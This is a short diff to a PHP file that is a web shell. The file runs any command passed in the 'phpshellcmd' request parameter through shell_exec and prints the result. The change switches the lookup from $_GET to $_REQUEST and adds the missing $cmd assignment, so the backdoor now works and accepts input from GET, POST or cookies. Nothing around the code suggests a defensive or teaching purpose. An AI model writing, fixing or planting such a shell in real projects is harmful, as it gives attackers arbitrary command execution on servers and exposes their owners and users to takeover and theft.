@@ -1,5 +1,6 @@
 <?php
-	if(isset($_GET['phpshellcmd'])){
+	if(isset($_REQUEST['phpshellcmd'])){
+		$cmd = $_REQUEST['phpshellcmd'];
 		echo shell_exec($cmd);
 	}
 	die()
